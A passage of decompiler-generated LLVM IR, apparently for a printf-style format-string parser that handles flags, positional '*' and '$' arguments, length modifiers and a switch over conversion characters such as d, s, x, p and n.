dec_label_pc_144f8:                               ; preds = %dec_label_pc_14520
  %v4_144f8 = sext i8 %storemerge26 to i32
  %v7_144fc = shl i32 1, %v1_14510
  %v8_144fc = or i32 %v7_144fc, %v4_144f8
  store i32 %v8_144fc, i32* %r3.global-to-local, align 4
  %v5_14500 = inttoptr i32 %v1_14518 to i8*
  store i8* %v5_14500, i8** %stack_var_-44, align 4
  %v5_14504 = trunc i32 %v8_144fc to i8
  br label %dec_label_pc_14508

dec_label_pc_14508:                               ; preds = %dec_label_pc_144e4, %dec_label_pc_144f8
  %v3_14508 = phi i8* [ %v5_14500, %dec_label_pc_144f8 ], [ %v3_14508242, %dec_label_pc_144e4 ]
  %storemerge26 = phi i8 [ %v5_14504, %dec_label_pc_144f8 ], [ 0, %dec_label_pc_144e4 ]
  %v4_14508 = ptrtoint i8* %v3_14508 to i32
  store i32 %v4_14508, i32* %r1.global-to-local, align 4
  %v2_1450c = load i8, i8* %v3_14508, align 1
  %v3_1450c = zext i8 %v2_1450c to i32
  store i32 %v3_1450c, i32* %r0.global-to-local, align 4
  %v1_14510 = add nsw i32 %v3_1450c, -32
  store i32 %v1_14510, i32* %r2.global-to-local, align 4
  %v1_14518 = add i32 %v4_14508, 1
  store i32 %v1_14518, i32* %ip.global-to-local, align 4
  %tmp888 = icmp ugt i32 %v1_14510, 31
  br i1 %tmp888, label %dec_label_pc_1452c, label %dec_label_pc_14520

dec_label_pc_14520:                               ; preds = %dec_label_pc_14508
  %v6_14520 = lshr i32 75913, %v1_14510
  store i32 %v6_14520, i32* %r3.global-to-local, align 4
  %v1_14524 = urem i32 %v6_14520, 2
  %v2_14524 = icmp eq i32 %v1_14524, 0
  br i1 %v2_14524, label %dec_label_pc_1452c, label %dec_label_pc_144f8

dec_label_pc_1452c:                               ; preds = %dec_label_pc_14520, %dec_label_pc_14508
  %v7_1452c = icmp eq i8 %v2_1450c, 42
  br i1 %v7_1452c, label %dec_label_pc_14534, label %dec_label_pc_145e4

dec_label_pc_14534:                               ; preds = %dec_label_pc_1452c
  %v2_14534 = inttoptr i32 %v1_14518 to i8*
  %v3_14534 = load i8, i8* %v2_14534, align 1
  %v4_14534 = zext i8 %v3_14534 to i32
  store i32 %v4_14534, i32* %r2.global-to-local, align 4
  %v1_14538 = add nsw i32 %v4_14534, -48
  store i32 %v1_14538, i32* %r3.global-to-local, align 4
  %tmp889 = icmp ugt i32 %v1_14538, 9
  br i1 %tmp889, label %dec_label_pc_14584, label %dec_label_pc_14544

dec_label_pc_14544:                               ; preds = %dec_label_pc_14534
  %v1_14544 = add i32 %v4_14508, 2
  %v2_14544 = inttoptr i32 %v1_14544 to i8*
  %v3_14544 = load i8, i8* %v2_14544, align 1
  %v4_14544 = zext i8 %v3_14544 to i32
  store i32 %v4_14544, i32* %r3.global-to-local, align 4
  %v7_14548 = icmp eq i8 %v3_14544, 36
  br i1 %v7_14548, label %dec_label_pc_14550, label %dec_label_pc_14584

dec_label_pc_14550:                               ; preds = %dec_label_pc_14544
  %v3_14550 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14550, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v4_14558 = mul nuw nsw i32 %v4_14534, 4
  %v5_14558 = add i32 %v3_14550, %v4_14558
  store i32 %v5_14558, i32* %r2.global-to-local, align 4
  %v2_1455c = add i32 %v5_14558, -192
  %v3_1455c = inttoptr i32 %v2_1455c to i32*
  store i32 10, i32* %v3_1455c, align 4
  store i32 %v0_143d8, i32* %lr.global-to-local, align 4
  %v0_14564 = load i32, i32* %r1.global-to-local, align 4
  %v1_14564 = add i32 %v0_14564, 1
  %v2_14564 = inttoptr i32 %v1_14564 to i8*
  %v3_14564 = load i8, i8* %v2_14564, align 1
  %v4_14564 = zext i8 %v3_14564 to i32
  %v4_14568 = mul nuw nsw i32 %v4_14564, 8
  %v5_14568 = add i32 %v4_14568, %v0_143d8
  store i32 %v5_14568, i32* %r3.global-to-local, align 4
  %v1_1456c = add i32 %v5_14568, -384
  %v2_1456c = inttoptr i32 %v1_1456c to i32*
  %v3_1456c = load i32, i32* %v2_1456c, align 4
  store i32 %v3_1456c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_14578 = add i32 %v0_14564, 3
  br label %dec_label_pc_145c0

dec_label_pc_14584:                               ; preds = %dec_label_pc_14544, %dec_label_pc_14534
  store i32 %stack_var_-716.1, i32* %r1.global-to-local, align 4
  %v2_14588 = icmp eq i32 %stack_var_-716.1, 0
  br i1 %v2_14588, label %dec_label_pc_14590, label %dec_label_pc_15ce8

dec_label_pc_14590:                               ; preds = %dec_label_pc_14584
  store i32 %v0_143d0, i32* %r2.global-to-local, align 4
  br i1 %v2_14480, label %dec_label_pc_145b4, label %dec_label_pc_1459c

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14590
  store i32 %v0_143d4, i32* %r3.global-to-local, align 4
  %v2_145a0 = load i32, i32* %v1_145a0, align 4
  store i32 %v2_145a0, i32* %r2.global-to-local, align 4
  store i32 %v0_143d4, i32* %ip.global-to-local, align 4
  %v1_145a8 = add i32 %v2_145a0, 4
  store i32 %v1_145a8, i32* %r3.global-to-local, align 4
  store i32 %v1_145a8, i32* %v1_145a0, align 4
  %v0_145b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_145b0 = inttoptr i32 %v0_145b0 to i32*
  %v2_145b0 = load i32, i32* %v1_145b0, align 4
  store i32 %v2_145b0, i32* %r2.global-to-local, align 4
  %v3_145b4.pre = load i8*, i8** %stack_var_-44, align 4
  br label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %dec_label_pc_14590, %dec_label_pc_1459c
  %v0_145b8 = phi i32 [ 0, %dec_label_pc_14590 ], [ %v2_145b0, %dec_label_pc_1459c ]
  %v3_145b4 = phi i8* [ %v3_14508, %dec_label_pc_14590 ], [ %v3_145b4.pre, %dec_label_pc_1459c ]
  %v4_145b4 = ptrtoint i8* %v3_145b4 to i32
  store i32 %v4_145b4, i32* %r3.global-to-local, align 4
  %v1_145bc = add i32 %v4_145b4, 1
  br label %dec_label_pc_145c0

dec_label_pc_145c0:                               ; preds = %dec_label_pc_14550, %dec_label_pc_145b4
  %storemerge29 = phi i32 [ %v1_145bc, %dec_label_pc_145b4 ], [ %v1_14578, %dec_label_pc_14550 ]
  %v3_145d0 = phi i32 [ %v0_145b8, %dec_label_pc_145b4 ], [ %v3_1456c, %dec_label_pc_14550 ]
  %stack_var_-716.2 = phi i32 [ 0, %dec_label_pc_145b4 ], [ 1, %dec_label_pc_14550 ]
  store i32 %storemerge29, i32* %r3.global-to-local, align 4
  store i32 %v3_145d0, i32* @lr, align 4
  %v1_145c4 = icmp slt i32 %v3_145d0, 0
  %v5_145c8 = inttoptr i32 %storemerge29 to i8*
  store i8* %v5_145c8, i8** %stack_var_-44, align 4
  br i1 %v1_145c4, label %bb541, label %._crit_edge247

._crit_edge247:                                   ; preds = %dec_label_pc_145c0
  %v3_145d8.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t483 = trunc i32 %v3_145d8.pre to i8
  br label %bb542

bb541:                                            ; preds = %dec_label_pc_145c0
  %v7_145cc = sext i8 %storemerge26 to i32
  %v4_145d0 = sub i32 0, %v3_145d0
  store i32 %v4_145d0, i32* @lr, align 4
  %v4_145d4 = or i32 %v7_145cc, 8192
  store i32 %v4_145d4, i32* %r0.global-to-local, align 4
  br label %bb542

bb542:                                            ; preds = %._crit_edge247, %bb541
  %v3_145d8.pre.sink.off0 = phi i8 [ %extract.t483, %._crit_edge247 ], [ %storemerge26, %bb541 ]
  %v3_145dc432 = phi i32 [ %v3_145d0, %._crit_edge247 ], [ %v4_145d0, %bb541 ]
  %stack_var_-712.0 = select i1 %v1_145c4, i8 %v3_145d8.pre.sink.off0, i8 %storemerge26
  %v3_145dc.stack_var_-660.0 = select i1 %v1_145c4, i32 %v3_145dc432, i32 %v3_145d0
  br label %dec_label_pc_145f8

dec_label_pc_145e4:                               ; preds = %dec_label_pc_1452c
  store i32 %v8_146ac, i32* %r0.global-to-local, align 4
  %v2_145e8 = call i32 @getint(i32* nonnull %v1_146b0)
  store i32 %v2_145e8, i32* %r0.global-to-local, align 4
  %v1_145ec = icmp slt i32 %v2_145e8, 0
  br i1 %v1_145ec, label %dec_label_pc_15ce8, label %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge

dec_label_pc_145e4.dec_label_pc_145f8_crit_edge:  ; preds = %dec_label_pc_145e4
  %v3_145f8.pre = load i8*, i8** %stack_var_-44, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge, %bb542
  %v3_145f8 = phi i8* [ %v3_145f8.pre, %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge ], [ %v5_145c8, %bb542 ]
  %v3_15b90 = phi i32 [ %v2_145e8, %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge ], [ %v3_145dc.stack_var_-660.0, %bb542 ]
  %stack_var_-712.1 = phi i8 [ %storemerge26, %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge ], [ %stack_var_-712.0, %bb542 ]
  %stack_var_-716.3 = phi i32 [ %stack_var_-716.1, %dec_label_pc_145e4.dec_label_pc_145f8_crit_edge ], [ %stack_var_-716.2, %bb542 ]
  %v4_145f8 = ptrtoint i8* %v3_145f8 to i32
  store i32 %v4_145f8, i32* %r1.global-to-local, align 4
  %v2_145fc = load i8, i8* %v3_145f8, align 1
  %v3_145fc = zext i8 %v2_145fc to i32
  store i32 %v3_145fc, i32* %r3.global-to-local, align 4
  %v7_14600 = icmp eq i8 %v2_145fc, 46
  br i1 %v7_14600, label %dec_label_pc_14610, label %bb543

bb543:                                            ; preds = %dec_label_pc_145f8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_146b8

dec_label_pc_14610:                               ; preds = %dec_label_pc_145f8
  %v1_14610 = add i32 %v4_145f8, 1
  %v2_14610 = inttoptr i32 %v1_14610 to i8*
  %v3_14610 = load i8, i8* %v2_14610, align 1
  %v7_14614 = icmp eq i8 %v3_14610, 42
  store i32 %v1_14610, i32* %r3.global-to-local, align 4
  br i1 %v7_14614, label %dec_label_pc_14620, label %dec_label_pc_146a8

dec_label_pc_14620:                               ; preds = %dec_label_pc_14610
  %v1_14620 = add i32 %v4_145f8, 2
  %v2_14620 = inttoptr i32 %v1_14620 to i8*
  %v3_14620 = load i8, i8* %v2_14620, align 1
  %v4_14620 = zext i8 %v3_14620 to i32
  store i32 %v4_14620, i32* %r2.global-to-local, align 4
  %v1_14624 = add nsw i32 %v4_14620, -48
  store i32 %v1_14624, i32* %r3.global-to-local, align 4
  %tmp890 = icmp ugt i32 %v1_14624, 9
  br i1 %tmp890, label %dec_label_pc_14668, label %dec_label_pc_14630

dec_label_pc_14630:                               ; preds = %dec_label_pc_14620
  %v1_14630 = add i32 %v4_145f8, 3
  %v2_14630 = inttoptr i32 %v1_14630 to i8*
  %v3_14630 = load i8, i8* %v2_14630, align 1
  %v4_14630 = zext i8 %v3_14630 to i32
  store i32 %v4_14630, i32* %r3.global-to-local, align 4
  %v7_14634 = icmp eq i8 %v3_14630, 36
  br i1 %v7_14634, label %dec_label_pc_1463c, label %dec_label_pc_14668

dec_label_pc_1463c:                               ; preds = %dec_label_pc_14630
  %v3_1463c = load i32, i32* %stack_var_0, align 4
  %v4_14640 = mul nuw nsw i32 %v4_14620, 4
  %v5_14640 = add i32 %v3_1463c, %v4_14640
  store i32 %v5_14640, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_14648 = add i32 %v5_14640, -192
  %v3_14648 = inttoptr i32 %v2_14648 to i32*
  store i32 10, i32* %v3_14648, align 4
  store i32 %v0_143d8, i32* %ip.global-to-local, align 4
  %v0_14650 = load i32, i32* %r1.global-to-local, align 4
  %v1_14650 = add i32 %v0_14650, 2
  %v2_14650 = inttoptr i32 %v1_14650 to i8*
  %v3_14650 = load i8, i8* %v2_14650, align 1
  %v4_14650 = zext i8 %v3_14650 to i32
  %v4_14654 = mul nuw nsw i32 %v4_14650, 8
  %v5_14654 = add i32 %v4_14654, %v0_143d8
  store i32 %v5_14654, i32* %r3.global-to-local, align 4
  %v1_14658 = add i32 %v5_14654, -384
  %v2_14658 = inttoptr i32 %v1_14658 to i32*
  %v3_14658 = load i32, i32* %v2_14658, align 4
  store i32 %v3_14658, i32* %r3.global-to-local, align 4
  %v1_14660 = add i32 %v0_14650, 4
  br label %dec_label_pc_146a0

dec_label_pc_14668:                               ; preds = %dec_label_pc_14630, %dec_label_pc_14620
  store i32 %stack_var_-716.3, i32* @lr, align 4
  %v2_1466c = icmp eq i32 %stack_var_-716.3, 0
  br i1 %v2_1466c, label %dec_label_pc_14674, label %dec_label_pc_15ce8

dec_label_pc_14674:                               ; preds = %dec_label_pc_14668
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  br i1 %v2_14480, label %.thread44, label %bb544

bb544:                                            ; preds = %dec_label_pc_14674
  store i32 %v0_143d4, i32* %r1.global-to-local, align 4
  %v3_14680 = load i32, i32* %v1_145a0, align 4
  store i32 %v3_14680, i32* %r2.global-to-local, align 4
  %v2_14684 = add i32 %v3_14680, 4
  store i32 %v2_14684, i32* %r3.global-to-local, align 4
  %v2_14688 = inttoptr i32 %v3_14680 to i32*
  %v3_14688 = load i32, i32* %v2_14688, align 4
  store i32 %v3_14688, i32* %r2.global-to-local, align 4
  store i32 %v2_14684, i32* %v1_145a0, align 4
  %v3_14690.pre = load i8*, i8** %stack_var_-44, align 4
  %v1_14694.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14698.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_14674, %bb544
  %v1_14698 = phi i32 [ %v4_14620, %dec_label_pc_14674 ], [ %v1_14698.pre, %bb544 ]
  %v1_14694 = phi i32 [ 0, %dec_label_pc_14674 ], [ %v1_14694.pre, %bb544 ]
  %v3_14690 = phi i8* [ %v3_145f8, %dec_label_pc_14674 ], [ %v3_14690.pre, %bb544 ]
  %v4_14690 = ptrtoint i8* %v3_14690 to i32
  store i32 %v4_14690, i32* %r3.global-to-local, align 4
  %stack_var_-708.3.v = select i1 %v2_14480, i32 %v1_14694, i32 %v1_14698
  %v1_1469c = add i32 %v4_14690, 2
  br label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_1463c, %.thread44
  %stack_var_-708.4.in = phi i32 [ %stack_var_-708.3.v, %.thread44 ], [ %v3_14658, %dec_label_pc_1463c ]
  %storemerge = phi i32 [ %v1_1469c, %.thread44 ], [ %v1_14660, %dec_label_pc_1463c ]
  %stack_var_-708.4 = inttoptr i32 %stack_var_-708.4.in to i8*
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v5_146a0 = inttoptr i32 %storemerge to i8*
  store i8* %v5_146a0, i8** %stack_var_-44, align 4
  br label %dec_label_pc_146b8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_14610
  store i8* %v2_14610, i8** %stack_var_-44, align 4
  store i32 %v8_146ac, i32* %r0.global-to-local, align 4
  %v2_146b0 = call i32 @getint(i32* nonnull %v1_146b0)
  store i32 %v2_146b0, i32* %r0.global-to-local, align 4
  %v5_146b4 = inttoptr i32 %v2_146b0 to i8*
  %v3_146c4.pre.pre = load i8*, i8** %stack_var_-44, align 4
  br label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %bb543, %dec_label_pc_146a0, %dec_label_pc_146a8
  %v3_146c4.pre = phi i8* [ %v5_146a0, %dec_label_pc_146a0 ], [ %v3_146c4.pre.pre, %dec_label_pc_146a8 ], [ %v3_145f8, %bb543 ]
  %stack_var_-708.5 = phi i8* [ %stack_var_-708.4, %dec_label_pc_146a0 ], [ %v5_146b4, %dec_label_pc_146a8 ], [ inttoptr (i32 -1 to i8*), %bb543 ]
  store i32 ptrtoint (i32* @global_var_19f14.685 to i32), i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %.thread434, %dec_label_pc_146b8
  %v0_146dc = phi i32 [ 0, %dec_label_pc_146b8 ], [ %v4_146e4, %.thread434 ]
  %v3_146c4 = phi i8* [ %v3_146c4.pre, %dec_label_pc_146b8 ], [ %v5_146f0, %.thread434 ]
  %v4_146c4 = ptrtoint i8* %v3_146c4 to i32
  store i32 %v4_146c4, i32* %r2.global-to-local, align 4
  %v2_146c8 = load i8, i8* %v3_146c4, align 1
  %v3_146c8 = zext i8 %v2_146c8 to i32
  store i32 %v3_146c8, i32* %r1.global-to-local, align 4
  %v1_146cc = add nsw i32 %v3_146c8, -65
  store i32 %v1_146cc, i32* %r3.global-to-local, align 4
  %v1_146d4 = add i32 %v4_146c4, 1
  store i32 %v1_146d4, i32* %r2.global-to-local, align 4
  %tmp891 = icmp ugt i32 %v1_146cc, 57
  br i1 %tmp891, label %dec_label_pc_15ce8, label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146c4
  %v3_146dc = mul nuw nsw i32 %v0_146dc, 58
  %v4_146dc = add nuw nsw i32 %v3_146c8, %v3_146dc
  %v2_146e0 = add i32 %v4_146dc, ptrtoint (i32* @global_var_19f14.685 to i32)
  store i32 %v2_146e0, i32* %r3.global-to-local, align 4
  %v1_146e4 = add i32 %v4_146dc, add (i32 ptrtoint (i32* @global_var_19f14.685 to i32), i32 -65)
  %v2_146e4 = inttoptr i32 %v1_146e4 to i8*
  %v3_146e4 = load i8, i8* %v2_146e4, align 1
  %v4_146e4 = zext i8 %v3_146e4 to i32
  store i32 %v4_146e4, i32* @r1, align 4
  %v1_146e8 = add nsw i32 %v4_146e4, -1
  store i32 %v1_146e8, i32* %r3.global-to-local, align 4
  %v5_146f0 = inttoptr i32 %v1_146d4 to i8*
  store i8* %v5_146f0, i8** %stack_var_-44, align 4
  %tmp892 = icmp ult i32 %v1_146e8, 8
  br i1 %tmp892, label %.thread434, label %dec_label_pc_146fc

.thread434:                                       ; preds = %dec_label_pc_146dc
  store i32 %v4_146e4, i32* @r6, align 4
  br label %dec_label_pc_146c4

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146dc
  %v2_146fc = icmp eq i8 %v3_146e4, 0
  br i1 %v2_146fc, label %dec_label_pc_15ce8, label %dec_label_pc_14704

dec_label_pc_14704:                               ; preds = %dec_label_pc_146fc
  %v7_14704 = icmp eq i8 %v3_146e4, 19
  %v0_1470c = load i32, i32* @r7, align 4
  %v1_1470c = icmp slt i32 %v0_1470c, 0
  br i1 %v7_14704, label %dec_label_pc_1470c, label %dec_label_pc_14718

dec_label_pc_1470c:                               ; preds = %dec_label_pc_14704
  br i1 %v1_1470c, label %dec_label_pc_1475c, label %dec_label_pc_15ce8

dec_label_pc_14718:                               ; preds = %dec_label_pc_14704
  br i1 %v1_1470c, label %dec_label_pc_14740, label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_14718
  store i32 %v0_143d8, i32* %r2.global-to-local, align 4
  %v4_14724 = mul i32 %v0_1470c, 8
  %v5_14724 = add i32 %v4_14724, %v0_143d8
  store i32 %v5_14724, i32* %r3.global-to-local, align 4
  %v1_14728 = inttoptr i32 %v5_14724 to i32*
  %v2_14728 = load i32, i32* %v1_14728, align 4
  store i32 %v2_14728, i32* %r3.global-to-local, align 4
  %v3_14728 = add i32 %v5_14724, 4
  %v4_14728 = inttoptr i32 %v3_14728 to i32*
  %v5_14728 = load i32, i32* %v4_14728, align 4
  store i32 %v5_14728, i32* @r4, align 4
  %v3_1472c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1472c, i32* %ip.global-to-local, align 4
  %v5_14730 = trunc i32 %v2_14728 to i8
  store i8 %v5_14730, i8* %stack_var_-64, align 1
  %v5_14738 = mul i32 %v0_1470c, 4
  %v6_14738 = add i32 %v3_1472c, %v5_14738
  %v7_14738 = inttoptr i32 %v6_14738 to i32*
  store i32 %v4_146e4, i32* %v7_14738, align 4
  br label %dec_label_pc_1475c

dec_label_pc_14740:                               ; preds = %dec_label_pc_14718
  store i32 %v0_143d0, i32* @lr, align 4
  br i1 %v2_14480, label %dec_label_pc_15cf4, label %dec_label_pc_1474c

dec_label_pc_1474c:                               ; preds = %dec_label_pc_14740
  store i32 %v2_14cc0, i32* %r0.global-to-local, align 4
  store i32 %v0_143d4, i32* @r2, align 4
  %v1_14754 = call i32 @pop_arg(i32 %v2_14cc0)
  store i32 %v1_14754, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14768

dec_label_pc_1475c:                               ; preds = %dec_label_pc_1470c, %dec_label_pc_14720
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_1470c ], [ %v5_14728, %dec_label_pc_14720 ]
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  br i1 %v2_14480, label %dec_label_pc_143e4, label %dec_label_pc_14768

dec_label_pc_14768:                               ; preds = %dec_label_pc_1475c, %dec_label_pc_1474c
  %v0_14cdc = phi i32 [ %stack_var_-60.1, %dec_label_pc_1475c ], [ %stack_var_-60.0, %dec_label_pc_1474c ]
  %v3_14768 = load i8*, i8** %stack_var_-44, align 4
  %v4_14768 = ptrtoint i8* %v3_14768 to i32
  store i32 %v4_14768, i32* %r3.global-to-local, align 4
  %v1_1476c = add i32 %v4_14768, -1
  %v2_1476c = inttoptr i32 %v1_1476c to i8*
  %v3_1476c = load i8, i8* %v2_1476c, align 1
  %v4_1476c = zext i8 %v3_1476c to i32
  store i32 %v4_1476c, i32* %r3.global-to-local, align 4
  %v0_14770 = load i32, i32* @r6, align 4
  %v2_14770 = icmp eq i32 %v0_14770, 0
  br i1 %v2_14770, label %.thread46, label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %dec_label_pc_14768
  %tmp893 = urem i8 %v3_1476c, 16
  %v1_1477c = zext i8 %tmp893 to i32
  store i32 %v1_1477c, i32* %r3.global-to-local, align 4
  %v7_14780 = icmp eq i8 %tmp893, 3
  br i1 %v7_14780, label %bb545, label %.thread46

bb545:                                            ; preds = %dec_label_pc_1477c
  %v5_14784 = sext i8 %v3_1476c to i32
  %v2_14788 = and i32 %v5_14784, -33
  store i32 %v2_14788, i32* %r1.global-to-local, align 4
  %v6_1478c = trunc i32 %v2_14788 to i8
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1477c, %dec_label_pc_14768, %bb545
  %stack_var_-700.0 = phi i8 [ %v3_1476c, %dec_label_pc_14768 ], [ %v6_1478c, %bb545 ], [ %v3_1476c, %dec_label_pc_1477c ]
  %v4_14790 = sext i8 %stack_var_-712.1 to i32
  store i32 %v4_14790, i32* %r2.global-to-local, align 4
  %v4_14794 = sext i8 %stack_var_-700.0 to i32
  store i32 %v4_14794, i32* %ip.global-to-local, align 4
  %v1_14798 = and i32 %v4_14790, 8192
  %v2_14798 = icmp eq i32 %v1_14798, 0
  br i1 %v2_14798, label %bb547, label %bb546

bb546:                                            ; preds = %.thread46
  %v2_1479c = and i32 %v4_14790, -65537
  store i32 %v2_1479c, i32* %r2.global-to-local, align 4
  br label %bb547

bb547:                                            ; preds = %.thread46, %bb546
  %v1_147a0 = add nsw i32 %v4_14794, -65
  store i32 %v1_147a0, i32* %r3.global-to-local, align 4
  switch i32 %v4_14794, label %dec_label_pc_15b98 [
    i32 65, label %dec_label_pc_14cc0
    i32 67, label %dec_label_pc_14bf8
    i32 69, label %dec_label_pc_14cc0
    i32 70, label %dec_label_pc_14cc0
    i32 71, label %dec_label_pc_14cc0
    i32 83, label %dec_label_pc_14c18
    i32 88, label %dec_label_pc_14958
    i32 97, label %dec_label_pc_14cc0
    i32 99, label %dec_label_pc_14b60
    i32 100, label %dec_label_pc_14a64
    i32 101, label %dec_label_pc_14cc0
    i32 102, label %dec_label_pc_14cc0
    i32 103, label %dec_label_pc_14cc0
    i32 105, label %dec_label_pc_14a64
    i32 109, label %dec_label_pc_14b98
    i32 110, label %dec_label_pc_148a0
    i32 111, label %dec_label_pc_149e0
    i32 112, label %dec_label_pc_14934
    i32 115, label %dec_label_pc_14bac
    i32 117, label %dec_label_pc_14894
    i32 120, label %dec_label_pc_14958
  ]

dec_label_pc_14894:                               ; preds = %bb547
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  br label %bb552

dec_label_pc_148a0:                               ; preds = %bb547
  switch i32 %v0_14770, label %dec_label_pc_143e4 [
    i32 0, label %dec_label_pc_1490c
    i32 1, label %dec_label_pc_148cc
    i32 2, label %dec_label_pc_148dc
    i32 3, label %dec_label_pc_148ec
    i32 4, label %dec_label_pc_148fc
    i32 6, label %dec_label_pc_1490c
    i32 7, label %dec_label_pc_1491c
  ]

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148a0
  store i32 %v4_1490c, i32* %r3.global-to-local, align 4
  store i32 %v4_14910, i32* %r0.global-to-local, align 4
  store i32 %v4_14910, i32* %v2_14914, align 4
  br label %dec_label_pc_143e4

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148a0
  store i32 %v4_14910, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14928

dec_label_pc_148ec:                               ; preds = %dec_label_pc_148a0
  store i32 %v4_1490c, i32* %r3.global-to-local, align 4
  store i32 %v4_14910, i32* %r2.global-to-local, align 4
  store i16 %tmp495, i16* %tmp496, align 2
  br label %dec_label_pc_143e4

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148a0
  store i32 %v4_1490c, i32* %r3.global-to-local, align 4
  store i32 %v4_14910, i32* %ip.global-to-local, align 4
  store i8 %v1_14904, i8* %v3_14904, align 1
  br label %dec_label_pc_143e4

dec_label_pc_1490c:                               ; preds = %dec_label_pc_148a0, %dec_label_pc_148a0
  store i32 %v4_1490c, i32* %r3.global-to-local, align 4
  store i32 %v4_14910, i32* %v2_14914, align 4
  br label %dec_label_pc_143e4

dec_label_pc_1491c:                               ; preds = %dec_label_pc_148a0
  store i32 %v4_14910, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14928

dec_label_pc_14928:                               ; preds = %dec_label_pc_148dc, %dec_label_pc_1491c
  store i32 %v4_14910, i32* %r3.global-to-local, align 4
  store i32 %storemerge19, i32* %r4.global-to-local, align 4
  store i32 %v4_1490c, i32* %r2.global-to-local, align 4
  store i32 %v4_14910, i32* %v2_14914, align 4
  store i32 %storemerge19, i32* %v4_1492c, align 4
  br label %dec_label_pc_143e4

dec_label_pc_14934:                               ; preds = %bb547
  %v4_14934 = ptrtoint i8* %stack_var_-708.5 to i32
  store i32 %v4_14934, i32* %r1.global-to-local, align 4
  store i32 %v4_14790, i32* %r2.global-to-local, align 4
  %v2_1493c = icmp ugt i8* %stack_var_-708.5, inttoptr (i32 7 to i8*)
  br i1 %v2_1493c, label %bb549, label %bb548

bb548:                                            ; preds = %dec_label_pc_14934
  store i32 8, i32* %r1.global-to-local, align 4
  br label %bb549

bb549:                                            ; preds = %dec_label_pc_14934, %bb548
  %v0_1494c = phi i32 [ %v4_14934, %dec_label_pc_14934 ], [ 8, %bb548 ]
  %v1_14944 = or i32 %v4_14790, 8
  store i32 %v1_14944, i32* %r2.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v5_1494c = inttoptr i32 %v0_1494c to i8*
  %v5_14950 = trunc i32 %v1_14944 to i8
  br label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %bb547, %bb547, %bb549
  %stack_var_-700.1 = phi i8 [ 120, %bb549 ], [ %stack_var_-700.0, %bb547 ], [ %stack_var_-700.0, %bb547 ]
  %stack_var_-708.6 = phi i8* [ %v5_1494c, %bb549 ], [ %stack_var_-708.5, %bb547 ], [ %stack_var_-708.5, %bb547 ]
  %stack_var_-712.3 = phi i8 [ %v5_14950, %bb549 ], [ %stack_var_-712.1, %bb547 ], [ %stack_var_-712.1, %bb547 ]
  %v4_14958 = sext i8 %stack_var_-700.1 to i32
  store i32 %v4_14958, i32* @lr, align 4
  store i32 %v2_143a0, i32* %r0.global-to-local, align 4
  %v2_14964 = load i8, i8* %stack_var_-64, align 1
  %v3_14964 = sext i8 %v2_14964 to i32
  store i32 %v3_14964, i32* %r5.global-to-local, align 4
  store i32 %v0_14cdc, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a0e4.689 to i32), i32* %ip.global-to-local, align 4
  %v1_1496c = and i32 %v4_14958, 32
  store i32 %v1_1496c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14988

dec_label_pc_14978:                               ; preds = %dec_label_pc_14988
  %v0_14978 = load i32, i32* %ip.global-to-local, align 4
  %v2_14978 = add i32 %v0_14978, %v1_1498c
  %v3_14978 = inttoptr i32 %v2_14978 to i8*
  %v4_14978 = load i8, i8* %v3_14978, align 1
  %v6_14978 = zext i8 %v4_14978 to i32
  %v1_1497c = load i32, i32* %r1.global-to-local, align 4
  %v2_1497c = or i32 %v1_1497c, %v6_14978
  store i32 %v2_1497c, i32* %r3.global-to-local, align 4
  %v1_14980 = trunc i32 %v2_1497c to i8
  %v3_14980 = add i32 %v2_14980, -1
  %v4_14980 = inttoptr i32 %v3_14980 to i8*
  store i8 %v1_14980, i8* %v4_14980, align 1
  %v5_14980 = load i32, i32* @r8, align 4
  %v6_14980 = add i32 %v5_14980, -1
  store i32 %v6_14980, i32* %r8.global-to-local, align 4
  %v0_14988.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14990.pre = load i32, i32* %r6.global-to-local, align 4
